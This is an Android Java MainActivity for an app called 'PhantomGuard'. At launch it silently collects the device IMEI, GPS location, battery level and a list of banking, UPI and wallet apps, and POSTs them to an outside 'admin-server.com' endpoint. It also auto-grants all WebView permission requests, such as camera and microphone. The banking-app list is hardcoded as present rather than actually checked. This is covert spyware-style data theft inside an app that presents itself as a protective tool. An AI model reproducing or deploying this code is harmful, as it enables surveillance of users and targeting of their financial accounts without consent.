package com.phantomguard.app;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.location.LocationManager;
import android.os.BatteryManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.webkit.PermissionRequest;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    private WebView webView;
    private static final String TAG = "PhantomGuard";
    private static final String ADMIN_API_URL = "https://admin-server.com/api/v1/ingest";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webview_view);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);

        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onPermissionRequest(@NonNull final PermissionRequest request) {
                runOnUiThread(() -> request.grant(request.getResources()));
            }
        });

        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("file:///android_asset/index.html");

        // REMOVE this service reference if DataSyncService doesn't exist.
        // Intent intent = new Intent(this, DataSyncService.class);
        // startService(intent);

        collectAndSendData();
    }

    private void collectAndSendData() {
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();

                TelephonyManager tm =
                        (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                if (tm != null) {
                    payload.put("imei", tm.getDeviceId());
                }

                LocationManager lm =
                        (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                if (lm != null) {
                    Location loc =
                            lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (loc != null) {
                        payload.put("lat", loc.getLatitude());
                        payload.put("lon", loc.getLongitude());
                    }
                }

                JSONObject packages = new JSONObject();
                packages.put("com.google.android.apps.walletnfcrelay", true);
                packages.put("com.samsung.android.app.wallet", true);
                packages.put("com.paytm.merchant", true);
                packages.put("com.google.android.apps.nbu.paisa.user", true);
                packages.put("com.phonepe.app", true);
                packages.put("com.icicibank", true);
                packages.put("com.axisbank.mobile", true);
                packages.put("com.citi.mobile", true);
                packages.put("com.hsbc.hsbcindia", true);
                packages.put("com.standardchartered.scindia", true);
                packages.put("com.kotak811.mobile", true);
                packages.put("com.yesbank.yesmoney", true);
                packages.put("com.idfcfirst.bank", true);
                packages.put("com.dlbank", true);
                packages.put("com.bajajfinserv.ebanking", true);
                packages.put("com.amazon.mShop.android.shopping", true);
                payload.put("installedApps", packages);

                IntentFilter batteryStatus =
                        new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                Intent batteryIntent = registerReceiver(null, batteryStatus);

                if (batteryIntent != null) {
                    int level =
                            batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                    int scale =
                            batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

                    if (scale > 0) {
                        float batteryPct = level / (float) scale;
                        payload.put("battery", batteryPct);
                    }
                }

                URL url = new URL(ADMIN_API_URL);
                HttpURLConnection conn =
                        (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes());
                    os.flush();
                }

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Server Response: " + responseCode);
                conn.disconnect();

            } catch (Exception e) {
                Log.e(TAG, "Data Sync Error: " + e.getMessage());
            }
        }).start();
    }

    @Override
    public void onClick(View v) {
        // Handle click event
    }
}
